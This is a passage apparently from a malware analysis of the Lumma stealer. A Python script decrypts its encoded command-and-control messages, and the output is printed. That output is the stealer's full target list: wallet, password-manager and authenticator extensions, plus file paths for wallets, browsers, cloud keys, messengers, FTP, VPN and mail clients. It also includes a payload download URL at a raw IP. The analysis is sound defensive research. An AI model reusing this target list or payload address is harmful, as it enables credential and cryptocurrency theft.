13ca+b1YtJEC1YDD3Fz9gdOfoV/H9makQ5OM/LTNmNAX0hLl6UCsHaYFFFO1LCSE1q+YWuZTDrFHu93w4NG8+AOqWjDcbOVAq2X4V9RcJYHj94lvtvM6JUOTxPTUNURZLoZa1OQNyXjKdTEe/SVA6Lri+BrOyzaIA/6doa3cjKEu3lvR6STMWcY9eQNknIW1gze5H6O3N+0+pvwl5cS87BuPS80YVYQgywR0k9QsManro/13soZL2Y+X8Fj4oanpFr9DzIQtvUHaIHV+3S1k0KLy5BP7jmvtWqb9id3lxelOvkaRoXDECYpRZDOkeRV9Fp+pO9r2E+w6p6HBhACNyS9CY82EbeVBRi08J7BgBd3Dm5UesjpusUO6nfnk/I2JYoZa3aBt5QCDCCFSwSVB+NfKpQKH10fUA+6doeX50Kwz/xKN0Xyoedd5jOasaF3A7palZofW6+wip2H55ISNiS8zEoXdQIBNkklAL9lQheWz77hav7YX7GLqpcD0oI2JbvY3mKgxxQm3XREfxWVozNav7FrntxLVN6OQ+OitxPAj51fRHZW07dJ5REewPGVB8+/1d4KrD9QDmp2gAeWwrCOGasnpaKxcy1x0I9hoMdSun6FXgp4T7f6enKHlhIxkZ/di4eFg3G3+VTErEARVxfKunFuft2+kOqeMheWEzaFC6heQpCT5ea9lLR79LTCFpq7EWpqOOukPn5CIrP2AsCKjojUtYIBlxnFoW2Sctanr75EfsqZX3b+LmIDQobj4d3sC4eFI6PH+PWhbaQxdmcvDpB+f3g7tV7tkOFzRiOQXewLBvXGFeMpYdX95ZEG9s5KVH8qOIrUem8jM3eVx0S/eW6zl3LAZ1iB1Jpx9COSmlqVLw7dvrErKyY25pMSVF9palOQNzXjKLHV+nXgFzae3qQOLqvYVh5OsxPit1Lwb/2LVHZQ0dZJ5FDOkXASE1q+YWuZTDl03/4CFidWU6S9CY82EbeVBelEsA9lQubG3s8V3vo4D7DqnhcGFrLXoP/pbrKQl6RSHODVX4VxshbauxBK/tkfsYqaAzKytlOR3skY1HbSsXMLleEaRZTCF0q7FvoeXPjWDJp355cS8MK8OW/TkTbT9DvB1Jp1FORlTFqRih5c+UccmnfnlxLzUL4szzNxtpXFG5e0epWUotX8XTFq/ty/d2yc5wd3krdiHP/fM3G2lcZINLR9hXQnk7s6l54qaN+WHn7Dc1L3J3PeXRk3pNYV4ynx1ftldCZWqrsQaz9tboF7m1L3cgIyxLt4T9OUlhSDK4BTnZKy1CUMWpGKGiw+N5qa98GBVMekWvnv9LdAVQPNkVS9U2LiE1q6Ea04Kt+w6prxEaGEkdR9358zcbaVxHq3JHqVlKLUnEqRih5c+McdmnD3d5e3pTr/mwclVjMXySWgvxCE9TfO7qR/a8w/UA76doaHcjPhqvjuMrAHRDJckPGKkAQnc7s7sYob/D4wCu6T04Om05Gf3QsG9YZi5Mtl4M6RkJcX3V12f3oJO8AKenP3lhWnpDo9CzOWRvUGrZBUfIGglvOcrnXeahlaoNxuQ7NzloKg2vmPN/G3lBPNlZFqdBUjMgvroBsf+c9Vmp8XBhay16Ga+O8z5YMwJ0mksEoCc8ZlSpyFjqqo+tAKenP3lhWnpDo9CwbxtvUDrVWwTxVhNrdKunFqnhhbhWpvIzN3ktekOj0bx3Gx5eMoEdX6c2AWp1qchY6qqPrVGkwD8YN2g9B/mW/TldYUgj1x0D9llaMSmwvAW2/dGkf/Y="
get_message = "BZTGAXtFHaqHJoJA/H2shHEK6p3GdT8UtRGvpJGau49e7+R0WX8/wvNS8nqgUvCrQD7ds/JAESCCP5eVzbXY4Gv8qXIPa3jS4gSuYpoJjr5BJsj45E8Paeg="

def _xor_decrypt(data: bytes, key_len: int):
    key = data[:key_len]
    encrypted_string = data[key_len:]
    decrypted_string = ["\x00"] * len(encrypted_string)
    for i in range(len(encrypted_string)):
        decrypted_string[i] = encrypted_string[i] ^ (key[i % key_len])
    try:
        return bytes(decrypted_string).decode("utf-8")
    except UnicodeDecodeError:
        return bytes(decrypted_string)

def lumma_decryption(data: str):
    try:
        data = base64.b64decode(data)
    except ValueError:
        print(f"Invalid base64 string.")
        return data
    else:
        return _xor_decrypt(data, 32)

print("recive_message")
parsed = json.loads(lumma_decryption(recive_message))
print(json.dumps(parsed, indent=4))
print("-"*50)
print("get_message")
parsed = json.loads(lumma_decryption(get_message))
print(json.dumps(parsed, indent=4))
print("-"*50)
```

<br><br>

```

recive_message
{
    "v": 4,
    "se": true,
    "ad": false,
    "vm": false,
    "ex": [
        {
            "en": "ejbalbakoplchlghecdalmeeeajnimhm",
            "ez": "MetaMask"
        },
        {
            "en": "aeblfdkhhhdcdjpifhhbdiojplfjncoa",
            "ez": "1Password"
        },
        {
            "en": "jnlgamecbpmbajjfhmmmlhejkemejdma",
            "ez": "Braavos"
        },
        {
            "en": "dlcobpjiigpikoobohmabehhmhfoodbb",
            "ez": "Agrent X"
        },
        {
            "en": "jgaaimajipbpdogpdglhaphldakikgef",
            "ez": "Coinhub"
        },
        {
            "en": "fcfcfllfndlomdhbehjjcoimbgofdncg",
            "ez": "Leap Wallet"
        },
        {
            "en": "lgmpcpglpngdoalbgeoldeajfclnhafa",
            "ez": "Safepal"
        },
        {
            "en": "hdokiejnpimakedhajhdlcegeplioahd",
            "ez": "LastPass"
        },
        {
            "en": "kjmoohlgokccodicjjfebfomlbljgfhk",
            "ez": "Ronin Wallet"
        },
        {
            "en": "pioclpoplcdbaefihamjohnefbikjilc",
            "ez": "Evernote"
        },
        {
            "en": "dngmlblcodfobpdpecaadgfbcggfjfnm",
            "ez": "MultiversX Wallet"
        },
        {
            "en": "kppfdiipphfccemcignhifpjkapfbihd",
            "ez": "ForniterWallet"
        },
        {
            "en": "mmmjbcfofconkannjonfmjjajpllddbg",
            "ez": "Fluvi Wallet"
        },
        {
            "en": "loinekcabhlmhjjbocijdoimmejangoa",
            "ez": "Glass Wallet"
        },
        {
            "en": "heefohaffomkkkphnlpohglngmbcclhi",
            "ez": "Morphis Wallet"
        },
        {
            "en": "idnnbdplmphpflfnlkomgpfbpcgelopg",
            "ez": "XVerse Wallet"
        },
        {
            "en": "anokgmphncpekkhclmingpimjmcooifb",
            "ez": "Compas Wallet"
        },
        {
            "en": "cnncmdhjacpkmjmkcafchppbnpnhdmon",
            "ez": "Havah Wallet"
        },
        {
            "en": "ocjdpmoallmgmjbbogfiiaofphbjgchh",
            "ez": "Sui Wallet"
        },
        {
            "en": "ojggmchlghnjlapmfbnjholfjkiidbch",
            "ez": "Venom Wallet"
        },
        {
            "en": "nkbihfbeogaeaoehlefnkodbefgpgknn",
            "ez": "MetaMask"
        },
        {
            "en": "egjidjbpglichdcondbcbdnbeeppgdph",
            "ez": "Trust Wallet"
        },
        {
            "en": "ibnejdfjmmkpcnlpebklmnkoeoihofec",
            "ez": "TronLink"
        },
        {
            "en": "fnjhmkhhmkbjkkabndcnnogagogbneec",
            "ez": "Ronin Wallet"
        },
        {
            "en": "mcohilncbfahbmgdjkbpemcciiolgcge",
            "ez": "OKX"
        },
        {
            "en": "fhbohimaelbohpjbbldcngcnapndodjp",
            "ez": "Binance Chain Wallet"
        },
        {
            "en": "ffnbelfdoeiohenkjibnmadjiehjhajb",
            "ez": "Yoroi"
        },
        {
            "en": "jbdaocneiiinmjbjlgalhcelgbejmnid",
            "ez": "Nifty"
        },
        {
            "en": "afbcbjpbpfadlkmhmclhkeeodmamcflc",
            "ez": "Math"
        },
        {
            "en": "hnfanknocfeofbddgcijnmhnfnkdnaad",
            "ez": "Coinbase",
            "ldb": true
        },
        {
            "en": "hpglfhgfnhbgpjdenjgmdgoeiappafln",
            "ez": "Guarda"
        },
        {
            "en": "blnieiiffboillknjnepogjhkgnoapac",
            "ez": "EQUA"
        },
        {
            "en": "cjelfplplebdjjenllpjcblmjkfcffne",
            "ez": "Jaxx Liberty"
        },
        {
            "en": "fihkakfobkmkjojpchpfgcmhfjnmnfpi",
            "ez": "BitApp"
        },
        {
            "en": "kncchdigobghenbbaddojjnnaogfppfj",
            "ez": "iWlt"
        },
        {
            "en": "kkpllkodjeloidieedojogacfhpaihoh",
            "ez": "EnKrypt"
        },
        {
            "en": "amkmjjmmflddogmhpjloimipbofnfjih",
            "ez": "Wombat"
        },
        {
            "en": "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
            "ez": "MEW CX"
        },
        {
            "en": "nanjmdknhkinifnkgdcggcfnhdaammmj",
            "ez": "Guild"
        },
        {
            "en": "nkddgncdjgjfcddamfgcmfnlhccnimig",
            "ez": "Saturn"
        },
        {
            "en": "cphhlgmgameodnhkjdmkpanlelnlohao",
            "ez": "NeoLine"
        },
        {
            "en": "nhnkbkgjikgcigadomkphalanndcapjk",
            "ez": "Clover"
        },
        {
            "en": "acmacodkjbdgmoleebolmdjonilkdbch",
            "ez": "Rabby"
        },
        {
            "en": "phkbamefinggmakgklpkljjmgibohnba",
            "ez": "Pontem"
        },
        {
            "en": "efbglgofoippbgcjepnhiblaibcnclgk",
            "ez": "Martian"
        },
        {
            "en": "nngceckbapebfimnlniiiahkandclblb",
            "ez": "Bitwarden"
        },
        {
            "en": "lpfcbjknijpeeillifnkikgncikgfhdo",
            "ez": "Nami"
        },
        {
            "en": "ejjladinnckdgjemekebdpeokbikhfci",
            "ez": "Petra"
        },
        {
            "en": "opcgpfmipidbgpenhmajoajpbobppdil",
            "ez": "Sui"
        },
        {
            "en": "aholpfdialjgjfhomihkjbmgjidlcdno",
            "ez": "ExodusWeb3"
        },
        {
            "en": "onhogfjeacnfoofkfgppdlbmlmnplgbn",
            "ez": "Sub"
        },
        {
            "en": "mopnmbcafieddcagagdcbnhejhlodfdd",
            "ez": "PolkadotJS"
        },
        {
            "en": "fijngjgcjhjmmpcmkeiomlglpeiijkld",
            "ez": "Talisman"
        },
        {
            "en": "hifafgmccdpekplomjjkcfgodnhcellj",
            "ez": "CryptoCom"
        },
        {
            "en": "kpfopkelmapcoipemfendmdcghnegimn",
            "ez": "Liquality"
        },
        {
            "en": "aiifbnbfobpmeekipheeijimdpnlpgpp",
            "ez": "Terra Station"
        },
        {
            "en": "dmkamcknogkgcdfhhbddcghachkejeap",
            "ez": "Keplr"
        },
        {
            "en": "fhmfendgdocmcbmfikdcogofphimnkno",
            "ez": "Sollet"
        },
        {
            "en": "cnmamaachppnkjgnildpdmkaakejnhae",
            "ez": "Auro"
        },
        {
            "en": "jojhfeoedkpkglbfimdfabpdfjaoolaf",
            "ez": "Polymesh"
        },
        {
            "en": "flpiciilemghbmfalicajoolhkkenfe",
            "ez": "ICONex"
        },
        {
            "en": "nknhiehlklippafakaeklbeglecifhad",
            "ez": "Nabox"
        },
        {
            "en": "hcflpincpppdclinealmandijcmnkbgn",
            "ez": "KHC"
        },
        {
            "en": "ookjlbkiijinhpmnjffcofjonbfbgaoc",
            "ez": "Temple"
        },
        {
            "en": "mnfifefkajgofkcjkemidiaecocnkjeh",
            "ez": "TezBox"
        },
        {
            "en": "lodccjjbdhfakaekdiahmedfbieldgik",
            "ez": "DAppPlay"
        },
        {
            "en": "ijmpgkjfkbfhoebgogflfebnmejmfbm",
            "ez": "BitClip"
        },
        {
            "en": "lkcjlnjfpbikmcmbachjpdbijejflpcm",
            "ez": "Steem Keychain"
        },
        {
            "en": "onofpnbbkehpmmoabgpcpmigafmmnjh",
            "ez": "Nash Extension"
        },
        {
            "en": "bcopgchhojmggmffilplmbdicgaihlkp",
            "ez": "Hycon Lite Client"
        },
        {
            "en": "klnaejjgbibmhlephnhpmaofohgkpgkd",
            "ez": "ZilPay"
        },
        {
            "en": "aeachknmefphepccionboohckonoeemg",
            "ez": "Coin98"
        },
        {
            "en": "bhghoamapcdpbohphigoooaddinpkbai",
            "ez": "Authenticator",
            "ses": true
        },
        {
            "en": "dkdedlpgdmmkkfjabffeganieamfklkm",
            "ez": "Cyano"
        },
        {
            "en": "nlgbhdfgdhgbiamfdfmbikcdghidoadd",
            "ez": "Byone"
        },
        {
            "en": "infeboajgfhgbjpjbeppbkgnabfdkdaf",
            "ez": "OneKey"
        },
        {
            "en": "cihmoadaighcejopammfbmddcmdekcje",
            "ez": "Leaf"
        },
        {
            "en": "bhhhlbepdkbapadjdnnojkbgioiodbic",
            "ez": "Solflare"
        },
        {
            "en": "mkpegjkblkkefacfnmkajcjmabijhclg",
            "ez": "Magic Eden"
        },
        {
            "en": "aflkmfhebedbjioipglgcbcmnbpgliof",
            "ez": "Backpack"
        },
        {
            "en": "gaedmjdfmmahhbjefcbgaolhhanlaolb",
            "ez": "Authy"
        },
        {
            "en": "oeljdldpnmdbchonielidgobddfffla",
            "ez": "EOS Authenticator",
            "ses": true
        },
        {
            "en": "ilgcnhelpchnceeipipijaljkblbcob",
            "ez": "GAuth Authenticator",
            "ses": true
        },
        {
            "en": "imloifkgjagghnncjkhggdhalmcnfklk",
            "ez": "Trezor Password Manager"
        },
        {
            "en": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
            "ez": "Phantom"
        },
        {
            "en": "ppbibelpcjmhbdihakflkdcoccbgbkpo",
            "ez": "UniSat"
        },
        {
            "en": "cpojfbodiccabbabgimdeohkkpjfpbnf",
            "ez": "Rainbow"
        },
        {
            "en": "jiidiaalihmmhddjgbnbgdfflelocpak",
            "ez": "Bitget Wallet"
        }
    ],
    "mx": [
        {
            "en": "webextension@metamask.io",
            "ez": "MetaMask",
            "et": "\"params\":{\"iterations\":600000}"
        }
    ],
    "c": [
        {
            "t": 0,
            "p": "%appdata%\\Ethereum",
            "m": [
                "keystore"
            ],
            "z": "Wallets/Ethereum",
            "d": 1,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\Exodus\\exodus.wallet",
            "m": [
                "*"
            ],
            "z": "Wallets/Exodus",
            "d": 2,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\Ledger Live",
            "m": [
                "*"
            ],
            "z": "Wallets/Ledger Live",
            "d": 2,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\atomic\\Local Storage\\leveldb",
            "m": [
                "*"
            ],
            "z": "Wallets/Atomic",
            "d": 2,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%localappdata%\\Coinomi\\Coinomi\\wallets",
            "m": [
                "*"
            ],
            "z": "Wallets/Coinomi",
            "d": 2,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\Authy Desktop\\Local Storage\\leveldb",
            "m": [
                "*"
            ],
            "z": "Wallets/Authy Desktop",
            "d": 2,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\Bitcoin\\wallets",
            "m": [
                "*"
            ],
            "z": "Wallets/Bitcoin core",
            "d": 2,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\Binance",
            "m": [
                "app-store.json",
                ".finger-print.fp",
                "simple-storage.json",
                "window-state.json"
            ],
            "z": "Wallets/Binance",
            "d": 1,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\com.liberty.jaxx\\IndexedDB",
            "m": [
                "*"
            ],
            "z": "Wallets/JAXX New Version",
            "d": 2,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\Electrum\\wallets",
            "m": [
                "*"
            ],
            "z": "Wallets/Electrum",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\Electrum-LTC\\wallets",
            "m": [
                "*"
            ],
            "z": "Wallets/Electrum-LTC",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\ElectronCash\\wallets",
            "m": [
                "*"
            ],
            "z": "Wallets/ElectronCash",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\Guarda\\IndexedDB",
            "m": [
                "*"
            ],
            "z": "Wallets/Guarda",
            "d": 2,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\DashCore\\wallets",
            "m": [
                "*.dat"
            ],
            "z": "Wallets/DashCore",
            "d": 1,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\WalletWasabi\\Client\\Wallets",
            "m": [
                "*"
            ],
            "z": "Wallets/Wasabi",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\Daedalus Mainnet\\wallets",
            "m": [
                "she.*.sqlite"
            ],
            "z": "Wallets/Daedalus",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 1,
            "p": "%localappdata%\\Google\\Chrome\\User Data",
            "z": "Chrome",
            "f": "Google Chrome",
            "n": "chrome.exe",
            "l": "chrome.dll"
        },
        {
            "t": 1,
            "p": "%localappdata%\\Google\\Chrome Beta\\User Data",
            "z": "Chrome Beta",
            "f": "Google Chrome Beta",
            "n": "chrome.exe",
            "l": "chrome.dll"
        },
        {
            "t": 1,
            "p": "%appdata%\\Opera Software\\Opera Stable",
            "z": "Opera"
        },
        {
            "t": 1,
            "p": "%localappdata%\\Opera Software\\Opera Neon\\User Data",
            "z": "Opera Neon"
        },
        {
            "t": 1,
            "p": "%appdata%\\Opera Software\\Opera GX Stable",
            "z": "Opera GX Stable"
        },
        {
            "t": 1,
            "p": "%localappdata%\\Microsoft\\Edge\\User Data",
            "z": "Edge",
            "f": "Microsoft Edge",
            "n": "msedge.exe",
            "l": "msedge.dll"
        },
        {
            "t": 1,
            "p": "%localappdata%\\BraveSoftware\\Brave-Browser\\User Data",
            "z": "Brave",
            "f": "BraveSoftware Brave-Browser",
            "n": "brave.exe",
            "l": "chrome.dll"
        },
        {
            "t": 1,
            "p": "%localappdata%\\Epic Privacy Browser\\User Data",
            "z": "EpicPrivacyBrowser"
        },
        {
            "t": 1,
            "p": "%localappdata%\\Vivaldi\\User Data",
            "z": "Vivaldi"
        },
        {
            "t": 1,
            "p": "%localappdata%\\Maxthon\\User Data",
            "z": "Maxthon"
        },
        {
            "t": 1,
            "p": "%localappdata%\\Iridium\\User Data",
            "z": "Iridium"
        },
        {
            "t": 1,
            "p": "%localappdata%\\AVG\\Browser\\User Data",
            "z": "AVG Secure Browser"
        },
        {
            "t": 1,
            "p": "%localappdata%\\Tencent\\QQBrowser\\User Data",
            "z": "QQBrowser"
        },
        {
            "t": 1,
            "p": "%localappdata%\\360Browser\\Browser\\User Data",
            "z": "360Browser"
        },
        {
            "t": 1,
            "p": "%localappdata%\\SuperBrowser\\User Data\\BrowserWorkbench_1",
            "z": "ZiNiao Browser"
        },
        {
            "t": 1,
            "p": "%localappdata%\\CentBrowser\\User Data",
            "z": "CentBrowser"
        },
        {
            "t": 1,
            "p": "%localappdata%\\Chedot\\User Data",
            "z": "Chedot"
        },
        {
            "t": 1,
            "p": "%localappdata%\\CocCoc\\Browser\\User Data",
            "z": "CocCoc"
        },
        {
            "t": 2,
            "p": "%appdata%\\Mozilla\\Firefox\\Profiles",
            "z": "Mozilla Firefox"
        },
        {
            "t": 2,
            "p": "%appdata%\\Waterfox\\Profiles",
            "z": "Waterfox"
        },
        {
            "t": 2,
            "p": "%appdata%\\Moonchild Productions\\Pale Moon\\Profiles",
            "z": "Pale Moon"
        },
        {
            "t": 0,
            "p": "%userprofile%",
            "m": [
                "*.kbdx"
            ],
            "z": "Applications/KeePass",
            "d": 2,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%localappdata%\\1Password",
            "m": [
                "*.sqlite*"
            ],
            "z": "Applications/1Password",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\Bitwarden",
            "m": [
                "data.json"
            ],
            "z": "Applications/Bitwarden",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\NordPass",
            "m": [
                "nordpass*.json",
                "nordpass*.sqlite"
            ],
            "z": "Applications/NordPass",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%userprofile%",
            "m": [
                "*seed*",
                "*pass*",
                "*ledger*",
                "*trezor*",
                "*metamask*",
                "*bitcoin*",
                "*words*",
                "*wallet*"
            ],
            "z": "Important Files/Profile",
            "d": 3,
            "fs": 1048576
        },
        {
            "t": 0,
            "p": "%userprofile%\\Desktop",
            "m": [
                "*.txt"
            ],
            "z": "Important Files/Desktop",
            "d": 2,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\Telegram Desktop",
            "m": [
                "*s"
            ],
            "z": "Applications/Telegram",
            "d": 3,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%programfiles%\\Telegram Desktop",
            "m": [
                "*s"
            ],
            "z": "Applications/Telegram",
            "d": 3,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%programfiles(x86)%\\Telegram Desktop",
            "m": [
                "*s"
            ],
            "z": "Applications/Telegram",
            "d": 3,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%localappdata%\\Packages\\TelegramMessengerLLP.TelegramDesktop_t4vj0pshhgkwm\\LocalCache\\Roaming\\Telegram Desktop UWP",
            "m": [
                "*s"
            ],
            "z": "Applications/Telegram UWP",
            "d": 3,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\FileZilla",
            "m": [
                "recentservers.xml",
                "sitemanager.xml"
            ],
            "z": "Applications/FileZilla",
            "d": 2,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\GHISLER",
            "m": [
                "wcx_ftp.ini"
            ],
            "z": "Applications/TotalCommander",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%userprofile%",
            "m": [
                "site.xml"
            ],
            "z": "Applications/AnyClient",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%programdata%\\SiteDesigner\\3D-FTP",
            "m": [
                "sites.ini"
            ],
            "z": "Applications/3D-FTP",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\SmartFTP\\Client 2.0\\Favorites",
            "m": [
                "*"
            ],
            "z": "Applications/SmartFTP",
            "d": 1,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\FTPGetter",
            "m": [
                "servers.xml"
            ],
            "z": "Applications/FTPGetter",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\FTPbox",
            "m": [
                "profiles.conf"
            ],
            "z": "Applications/FTPbox",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\FTPInfo",
            "m": [
                "ServerList.xml"
            ],
            "z": "Applications/FTPInfo",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\FTPRush",
            "m": [
                "RushSite.xml"
            ],
            "z": "Applications/FTPRush",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%programfiles(x86)%\\FTP Commander Deluxe",
            "m": [
                "FTPLIST.TXT"
            ],
            "z": "Applications/FTP Commander Deluxe",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%localappdata%\\DeskShare Data\\FTP Manager Lite",
            "m": [
                "FTPManagerLiteSettings.db"
            ],
            "z": "Applications/FTP Manager Lite",
            "d": 1,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%localappdata%\\DeskShare Data\\Auto FTP Manager",
            "m": [
                "AutoFTPManagerSettings.db"
            ],
            "z": "Applications/Auto FTP Manager",
            "d": 1,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\OpenVPN Connect",
            "m": [
                "config.json",
                "*.ovpn"
            ],
            "z": "Applications/OpenVPN",
            "d": 1,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%localappdata%\\NordVPN\\NordVPN.exe_Path_5foiwug0gwlftdgafkj0xqqcuqqyshwn",
            "m": [
                "user.config"
            ],
            "z": "Applications/NordVPN",
            "d": 1,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%localappdata%\\ProtonVPN\\ProtonVPN_Url_cmnccr2xp2ofmvhglly0haihuyzzqh0i",
            "m": [
                "user.config"
            ],
            "z": "Applications/ProtonVPN",
            "d": 1,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\AnyDesk",
            "m": [
                "*.conf"
            ],
            "z": "Applications/AnyDesk",
            "d": 2,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%userprofile%\\.azure",
            "m": [
                "*"
            ],
            "z": "Applications/Azure",
            "d": 1,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%userprofile%\\.aws",
            "m": [
                "*"
            ],
            "z": "Applications/Azure",
            "d": 1,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%localappdata%\\.IdentityService",
            "m": [
                "msal.cache",
                "msalv2.cache"
            ],
            "z": "Applications/Azure",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%localappdata%\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState",
            "m": [
                "plum.sqlite-wal"
            ],
            "z": "Notes",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\Conceptworld\\Notezilla",
            "m": [
                "Notes9.db"
            ],
            "z": "Notes/Notezilla",
            "d": 0,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\The Bat!",
            "m": [
                "*.TBB",
                "*.TBN",
                "*.MSG",
                "*.EML",
                "*.MSB",
                "*.mbox",
                "*.ABD",
                "*.FLX",
                "*.TBK",
                "*.HBI",
                "*.txt"
            ],
            "z": "Mail Clients/TheBat",
            "d": 3,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "C:\\PMAIL",
            "m": [
                "*.CNM",
                "*.PMF",
                "*.PMN",
                "*.PML",
                "*CACHE.PM",
                "*.WPM",
                "*.PM",
                "*.USR"
            ],
            "z": "Mail Clients/Pegasus",
            "d": 3,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%localappdata%\\Mailbird\\Store",
            "m": [
                "*.db"
            ],
            "z": "Mail Clients/Mailbird",
            "d": 3,
            "fs": 20971520
        },
        {
            "t": 0,
            "p": "%appdata%\\eM Client",
            "m": [
                "*.dat",
                "*.dat-shm",
                "*.dat-wal",
                "*.eml"
            ],
            "z": "Mail Clients/EmClient",
            "d": 3,
            "fs": 20971520
        }
    ]
}
--------------------------------------------------
get_message
[
    {
        "u": "http://147.45.47.81/conhost.exe",
        "ft": 0,
        "e": 0
    }
]
--------------------------------------------------
```